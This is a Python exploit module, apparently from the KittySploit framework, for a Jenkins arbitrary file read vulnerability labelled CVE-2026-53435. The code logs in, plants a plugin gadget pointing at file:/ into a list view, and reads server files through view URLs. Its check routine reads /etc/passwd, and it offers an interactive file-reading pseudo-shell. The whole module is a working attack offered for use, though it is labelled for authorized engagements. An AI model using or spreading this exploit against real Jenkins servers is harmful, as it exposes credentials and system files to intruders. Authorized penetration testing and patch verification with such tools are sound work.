#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-53435 — Jenkins authenticated arbitrary file read via ListView gadget."""

from typing import Dict

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.jenkins import Jenkins
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Jenkins, Lfi):
    __info__ = {
        "name": "Jenkins CVE-2026-53435 ListView Plugin DummyImpl File Read",
        "description": (
            "Authenticated arbitrary file read on unpatched Jenkins: plant "
            "hudson.Plugin$DummyImpl with baseResourceURL=file:/ into a ListView "
            "DescribableList (properties), then reach files via Stapler routing "
            "(/view/<name>/properties/0/<path>). Requires View/Configure (createView "
            "or overwrite view config.xml). Authorized engagements only."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-53435"],
        "references": [
            "https://www.jenkins.io/security/",
        ],
        "tags": [
            "jenkins",
            "ci",
            "file-read",
            "lfi",
            "authenticated",
            "cve-2026-53435",
            "authorized-only",
        ],
    }

    port = OptPort(8080, "Jenkins HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    path = OptString("/", "Jenkins base path (e.g. /jenkins)", required=False)
    username = OptString("", "Jenkins username", required=True)
    password = OptString("", "Jenkins password", required=True)
    view_name = OptString(
        "cve53435",
        "ListView name to create (or overwrite if create fails)",
        required=False,
    )
    output_file = OptString(
        "",
        "Optional local path to save retrieved file contents",
        required=False,
    )
    output_limit = OptInteger(
        12000,
        "Max characters to print when output_file is empty (0 = full)",
        required=False,
        advanced=True,
    )

    def _prepare_session(self) -> Dict[str, str]:
        self.jenkins_set_basic_auth(self.username, self.password)
        who, code = self.jenkins_whoami()
        print_info(f"Authenticated as: {who or '??'} (HTTP {code})")
        crumb = self.jenkins_fetch_crumb()
        if crumb:
            print_status(f"CSRF crumb set ({next(iter(crumb.keys()))})")
        else:
            print_warning("No crumb issuer (or auth failed) — continuing without crumb")
        return crumb

    def execute(self, file_path: str) -> str:
        """Lfi mixin hook: plant gadget if needed, then read ``file_path``."""
        remote = (file_path or "").strip()
        if not remote:
            return ""

        try:
            crumb = self._prepare_session()
        except ValueError as exc:
            print_error(str(exc))
            return ""

        ok, used = self.jenkins_plant_view_gadget(
            str(self.view_name or "cve53435"),
            headers=crumb,
        )
        if not ok:
            print_error(
                "No writable view found. Need View/Configure "
                "(createView or view config.xml POST)."
            )
            return ""

        body, code = self.jenkins_read_via_view_gadget(used, remote)
        print_status(
            f"GET /view/{used}/properties/0/{remote.lstrip('/')} -> HTTP {code}"
        )
        if code != 200 or not body:
            print_error("File read failed or empty response")
            return ""
        return body

    def check(self):
        try:
            self.jenkins_set_basic_auth(self.username, self.password)
        except ValueError as exc:
            return {"vulnerable": False, "reason": str(exc), "confidence": "low"}

        who, code = self.jenkins_whoami()
        if code in (401, 403) or not who:
            return {
                "vulnerable": False,
                "reason": f"Auth failed or whoAmI unavailable (HTTP {code})",
                "confidence": "medium",
            }

        try:
            crumb = self.jenkins_fetch_crumb()
            ok, used = self.jenkins_plant_view_gadget(
                str(self.view_name or "cve53435"),
                headers=crumb,
            )
            if not ok:
                return {
                    "vulnerable": False,
                    "reason": (
                        f"Authenticated as {who}, but no View/Configure permission "
                        "to plant the ListView gadget"
                    ),
                    "confidence": "medium",
                }
            body, rcode = self.jenkins_read_via_view_gadget(used, "/etc/passwd")
        except Exception as exc:
            return {
                "vulnerable": False,
                "reason": f"Probe failed: {exc}",
                "confidence": "low",
            }

        if rcode == 200 and body and ("root:" in body or "daemon:" in body):
            return {
                "vulnerable": True,
                "reason": f"CVE-2026-53435 confirmed: /etc/passwd read via view '{used}'",
                "confidence": "high",
            }
        if rcode == 200 and body:
            return {
                "vulnerable": True,
                "reason": (
                    f"View gadget planted on '{used}' and returned {len(body)} bytes "
                    "(probe content unexpected — try a known Windows path)"
                ),
                "confidence": "medium",
            }
        return {
            "vulnerable": False,
            "reason": (
                f"Authenticated as {who}; gadget plant ok on '{used}' but "
                f"file read returned HTTP {rcode}"
            ),
            "confidence": "medium",
        }

    def run(self):
        if self.shell_lfi:
            print_status("LFI pseudo-shell (paths read via Jenkins view gadget)")
            self.handler_lfi()
            return True

        remote = str(self.file_read or "").strip()
        if not remote:
            print_error("file_read is required")
            return False

        data = self.execute(remote)
        if not data:
            return False

        local = str(self.output_file or "").strip()
        if local:
            try:
                with open(local, "w", encoding="utf-8", errors="replace") as fh:
                    fh.write(data)
                print_success(f"Wrote {len(data)} bytes to {local}")
            except OSError as exc:
                print_error(f"Failed to write {local}: {exc}")
                return False
        else:
            limit = int(self.output_limit or 0)
            if limit > 0 and len(data) > limit:
                print_info(data[:limit])
                print_warning(f"... truncated ({len(data)} bytes total; set output_limit 0 for full)")
            else:
                print_info(data)
        return True
